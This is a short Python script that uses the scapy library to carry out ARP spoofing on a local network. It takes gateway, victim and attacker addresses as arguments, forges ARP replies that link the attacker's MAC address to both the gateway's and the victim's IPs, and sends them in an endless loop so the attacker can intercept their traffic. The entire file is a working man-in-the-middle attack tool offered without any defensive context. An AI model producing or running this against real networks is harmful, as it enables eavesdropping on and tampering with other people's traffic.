import time
import sys
# from scapy.all import ARP, send
import scapy.all
if len(sys.argv) != 7:
    print("useage: sudo python3 arp_spoof.py <gateway_ip> <victim_ip> <attacker_mac> <gateway_mac> <victim_mac> <ethernet_interface>")

gateway_ip = sys.argv[1]
victim_ip = sys.argv[2]
attacker_mac = sys.argv[3]
gateway_mac = sys.argv[4]
victim_mac = sys.argv[5]
iface = sys.argv[6]

#arp packets
arp_reply_vict = scapy.all.ARP(
    op=2,  #request(1), response(2)
    psrc=gateway_ip,
    pdst=victim_ip,
    hwsrc=attacker_mac,
    hwdst=victim_mac,
)

arp_reply_gate = scapy.all.ARP(
    op=2,  #request(1), response(2)
    psrc=victim_ip,
    pdst=gateway_ip,
    hwsrc=attacker_mac,
    hwdst=gateway_mac,
)

#send
while(True):
    # print(arp_reply_vict)
    # print(arp_reply_gate)
    # scapy.all.sendp(arp_reply_vict, iface=iface, verbose=4)
    # scapy.all.sendp(arp_reply_gate, iface=iface, verbose=4)
    scapy.all.send(arp_reply_vict, iface=iface, verbose=1)
    scapy.all.send(arp_reply_gate, iface=iface, verbose=1)
    # time.sleep(2)
